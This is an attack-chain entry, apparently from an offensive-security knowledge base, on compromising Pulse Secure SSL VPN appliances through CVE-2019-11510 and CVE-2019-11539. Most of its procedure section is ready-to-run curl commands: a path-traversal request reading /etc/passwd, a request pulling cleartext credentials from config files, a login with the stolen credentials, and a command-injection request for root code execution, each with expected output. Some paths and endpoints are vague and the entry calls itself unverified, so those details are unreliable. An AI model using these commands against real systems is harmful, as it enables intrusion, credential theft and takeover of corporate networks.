---
tags:
  - pulse-secure
  - ssl-vpn
  - arbitrary-file-read
  - command-injection
  - rce
  - credential-theft
  - cve-2019-11510
  - cve-2019-11539
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Pulse-Secure-Arbitrary-File-Read]]'
  - '[[procedures/Extract-Plaintext-Credentials-via-File-Read]]'
  - '[[procedures/Authenticate-to-Pulse-Secure-VPN-with-Stolen-Credentials]]'
  - '[[procedures/Exploit-Post-Auth-Command-Injection-for-RCE]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Credentials In Files]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:26:22.460Z'
description: >-
  A multi-stage attack exploiting pre-authentication arbitrary file reading in
  Pulse Secure SSL VPN (CVE-2019-11510) to steal credentials, authenticate, and
  then achieve root remote code execution via post-auth command injection
  (CVE-2019-11539).
skill_level: intermediate
impact_level: high
id: 3782572a-c2dd-4799-885f-b91030a32d5b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Credentials In Files]]'
  - '[[Unix Shell]]'
---
# Pulse Secure SSL VPN Arbitrary File Read Leading to Credential Theft and Root RCE

Multi-stage attack chain exploiting vulnerabilities in Pulse Secure SSL VPN to achieve full system compromise and intranet access.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Pre-Auth File Read] --> B[Credential Theft]
    B --> C[VPN Authentication]
    C --> D[Post-Auth RCE]
    D --> E[Intranet Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#e67e22
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Pulse Secure SSL VPN appliance (version vulnerable to CVE-2019-11510 and CVE-2019-11539)
- Required services/ports: HTTPS (443) for VPN access
- Network access requirements: Direct internet access to the VPN endpoint

### Initial Access Requirements

- No prior credentials needed (pre-auth exploit)
- Network position: External attacker
- Prior access needed: None

## Detailed Attack Procedures

### Step 1: Exploit Pre-Auth Arbitrary File Read
procedure: [[procedures/Exploit-Pulse-Secure-Arbitrary-File-Read]]

**Objective**: Leverage path traversal in the Guacamole endpoint to read sensitive system files like /etc/passwd, confirming the vulnerability.

**Instructions**: Use [[commands/curl-exploit-pulse-secure-file-read]] to send a crafted HTTP request exploiting the path traversal:

```bash
curl -i -k --path-as-is https://target-vpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```

**Expected Output**: HTTP response containing the contents of /etc/passwd, such as user entries like "root:x:0:0:root:/root:/bin/bash".

**Success Indicators**:
- File contents returned in response body
- No 404 or access denied errors

### Step 2: Extract Plaintext Credentials
procedure: [[procedures/Extract-Plaintext-Credentials-via-File-Read]]

**Objective**: Use the same file read vulnerability to locate and extract VPN credentials stored in cleartext on the filesystem.

**Instructions**: Modify the path in [[commands/curl-exploit-pulse-secure-file-read]] to target credential files, such as /etc/passwd or known Pulse Secure config paths like /var/pulse-secure/ivman/ or similar storage locations:

```bash
curl -i -k --path-as-is https://target-vpn/dana-na/../dana/html5acc/guacamole/../../../../../../var/pulse-secure/config?/dana/html5acc/guacamole/
```

**Expected Output**: Plaintext credentials, including usernames and passwords for VPN authentication.

**Success Indicators**:
- Readable credential data in response
- Valid username/password pairs extracted

### Step 3: Authenticate to VPN
procedure: [[procedures/Authenticate-to-Pulse-Secure-VPN-with-Stolen-Credentials]]

**Objective**: Use the stolen credentials to gain authenticated access to the Pulse Secure SSL VPN.

**Instructions**: Use a web browser or [[tools/curl]] to submit a login request with the extracted credentials to the VPN portal:

```bash
curl -k -c cookies.txt -d "username=stolen_user&password=stolen_pass" https://target-vpn/dana-na/auth/url_default/welcome.cgi
```

**Expected Output**: Successful login redirect or session cookie indicating authenticated access.

**Success Indicators**:
- Valid session established
- Access to post-auth VPN resources

### Step 4: Exploit Post-Auth Command Injection for RCE
procedure: [[procedures/Exploit-Post-Auth-Command-Injection-for-RCE]]

**Objective**: After authentication, inject commands via the vulnerable post-auth endpoint to execute arbitrary code as root, compromising the system.

**Instructions**: With an authenticated session, target the command injection vulnerability (e.g., via /getuser.php or similar) using [[tools/curl]] to inject a payload like `; id;`:

```bash
curl -k -b cookies.txt "https://target-vpn/dana-na/getuser.php?arg1=valid&arg2=; id ;"
```

**Expected Output**: Command output in response, e.g., "uid=0(root) gid=0(root) groups=0(root)" confirming root execution.

**Success Indicators**:
- Arbitrary command output returned
- Ability to run commands like `whoami` or download payloads

## Attack Chain Summary

### Key Achievements

1. Pre-auth credential theft without authentication
2. Successful VPN login using stolen creds
3. Root RCE on the VPN appliance
4. Potential lateral movement to intranet

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Credentials In Files]]
- [[Unix Shell]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Credential Access]]
- [[Execution]]

---
*Last updated: 2024-10-01T00:00:00Z*
